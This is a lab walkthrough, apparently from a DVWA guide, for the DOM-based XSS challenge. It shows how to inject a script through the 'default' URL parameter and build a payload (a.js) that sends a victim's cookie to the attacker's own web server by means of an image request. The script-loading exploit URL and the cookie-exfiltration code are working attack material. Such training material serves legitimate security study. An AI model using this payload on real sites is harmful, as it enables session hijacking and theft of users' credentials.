<b>Challenge URL:</b> /dvwa/vulnerabilities/xss_d/
<br>
<b>Objective:</b> Steal the cookie of a logged-in user.
<br>
<b>Tools needed:</b> A temporary web server
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/README.md">README</a>?</i>

<h2><b>The Guide</b></h2>

<h3><b>Examining the Form</b></h3>

Before we begin, we should probably define what DOM-based cross-site scripting (XSS) vulnerabilities are. "DOM" stands for "<a href="https://en.wikipedia.org/wiki/Document_Object_Model" target="_blank">Document Object Model</a>". We don't care too much about the details; all we need to know is it allows Javascript to change all parts of a given HTML page. When related to XSS, it means that we should explore how we can exploit an XSS vulnerability as present in the DOM environment (usually the URL), not store it in the page itself.

Now let's look at the form.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssdform.png" width="500">

We see a dropdown with several language choices. If we choose a language from the dropdown and click the "Select" button, we see the URL has changed to something like this:

<b>http&#58;//dvwa/dvwa/vulnerabilities/xss_d/?default=English</b>

<h3><b>Testing for XSS</b></h3>

Knowing what we do about DOM-based XSS vulnerabilities, it seems the best place to start is by modifying that <b>default</b> parameter. Why don't we try a classic XSS exploit test?

<code>&#60;script&#62;alert(document.cookie)&#60;/script&#62;</code>

Plop it in the URL, like so:

<b>http&#58;//dvwa/dvwa/vulnerabilities/xss_d/?default=&#60;script&#62;alert(document.cookie)&#60;/script&#62;</b>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssdalert.png" width="500">

<i>Note that I actually input <code>document.cookie.split(";")[0]</code> as my payload, in order to hide my session ID. Just a privacy thing for me. You don't have to do that, and it impacts nothing besides what you see in my screenshots.</i>

Nice, we see the cookie details! However, we experience a bit of a problem. This <code>alert</code> script only displays the cookie details to the current logged in user. That doesn't do us much good - how likely is it that during a pentest, we'll have visual access to every victim's screen? Let's try to find a way to get the cookie on Kali, no matter where the victims are.

<h3><b>Getting the Cookie, Remotely</b></h3>

To get started with this, we'll need a web server. Let's stand a temporary one up on Kali with the command:

<code>python -m SimpleHTTPServer 9999</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssdwebserver.png" width="500">

We'll need this for a very important reason - we can log every single request made to the server. This holds true regardless of the validity of the URL. If we can find a way to extract information by building a URL with the info and requesting it from our web server, we should find the stolen information in our server logs. Let's illustrate how this will work below.

I personally like to build a malicious URL that points to an existing Javascript file on my webserver. That valid Javascript file will actually hold my payload (in this case, an invalid URL request built with the stolen cookie info). I like this approach since it allows me to arbitrarily modify the payload with having to change the exploit itself. Plus, if we name the file something small, like "a.js", we can avoid many content length restrictions.

<h4><b>Building The Exploit</b></h4>

We won't need to spend much time on this one. All we need to do is specify a source file (which we'll call "a.js") in the XSS exploit. And to stay stealthy, we won't cause a visible <code>alert</code> anymore. Here's what we get:

<code>&#60;script src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/script&#62;</code>

When this script gets executed, it will try to pull the "a.js" file from your Python web server root, then will execute any code in that file.

<h4><b>Building the Payload</b></h4>

As I said above, we need to find a way to take the stolen cookie, build a URL with that information, then request it from our web server. There are a couple of ways to do so, but I use the following code:

<code>function getimg() {</code>
<br>
  <code>var img = document.createElement('img');</code>
  <br>
  <code>img.src = 'http://[your_Kali_IP]:9999/' + document.cookie;</code>
  <br>
  <code>document.body.appendChild(img);</code>
  <br>
<code>}</code>
<br><br>
<code>getimg();</code>

First, we define the function <code>getImg()</code>. The first line of the function defines a new <code>img</code> web page element and stores that in the variable <code><b>img</b></code>. We specify the source of this new element as a fake web page with a name set to whatever the user's cookie is set to. It then states that the page is hosted on our temporary web server. It then puts the final <code>img</code> element at the bottom of the web page. Finally, we execute the function.

Let's save this file as "a.js" and place it in our web server root.

<h4><b>Running the Payload</b></h4>

Now let's put it all together. Here's our final exploit.

<b>http&#58;//dvwa/dvwa/vulnerabilities/xss_d/?default=&#60;script src="http://</b>[your_Kali_IP]<b>:9999/a.js"&#62;&#60;/script&#62;</b>

Let's visit the URL in our browser. If we're lucky, the web server logs will show the cookie as a URL request.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssdcookie.png" width="500">

There we go! We see three requests:
<ol type="1">
  <li>The request to our payload, with a server responce code of 200 (success); </li>
  <li>A 404 response code, showing that we couldn't access a file (meaning our payload executed); and </li>
  <li>The actual request made, which has our cookie! Remember I truncated my cookie output as before.</li>
</ol>

Now as long as we have our web server, we can adjust our exploit to point to its IP address. Then we can get our victim's cookie from anywhere. Challenge complete!
